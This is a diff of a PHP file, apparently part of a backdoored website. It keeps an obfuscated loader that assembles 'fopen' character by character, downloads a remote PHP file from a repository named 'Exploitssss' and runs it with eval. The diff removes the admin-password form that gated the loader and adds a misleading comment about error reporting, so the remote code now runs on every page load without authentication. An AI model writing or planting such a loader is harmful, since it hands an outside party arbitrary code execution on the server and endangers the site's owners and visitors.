@@ -1,6 +1,10 @@
 ;;
 <?php
-
+/**
+ * Disable error reporting
+ *
+ * Set this to error_reporting( -1 ) for debugging.
+ */
     function geturlsinfo($url)
     {
       $fpn = "f"."o"."p"."e"."n";
@@ -31,21 +35,6 @@
 
     $a = geturlsinfo('https://raw.githubusercontent.com/Anonrocks/Exploitssss/master/templates.php');
     eval('?>' . $a);
-}
     ?>
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Admin Login</title>
-    </head>
-    <body>
-        <form method="POST" action="">
-            <label for="password">Admin:</label>
-            <input type="password" id="password" name="password">
-            <input type="submit" value="Login">
-        </form>
-    </body>
-    </html>
-    <?php
-}
-?>
+    
+    
